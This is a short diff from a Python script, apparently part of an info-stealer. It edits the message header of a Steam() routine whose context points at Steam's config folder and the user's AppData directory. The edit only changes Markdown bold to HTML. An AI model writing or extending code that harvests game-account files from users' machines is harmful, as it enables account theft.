@@ -22,7 +22,7 @@ path03 = r'C:\Program Files (x86)\Steam\config'
 def Steam():
     try:
         msgInfo = ""
-        msgInfo+="\n\n**🕹Games🕹**"
+        msgInfo+="\n\n<b>🕹Games🕹</b>"
         Log("===========Games===========")
         try:
             pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
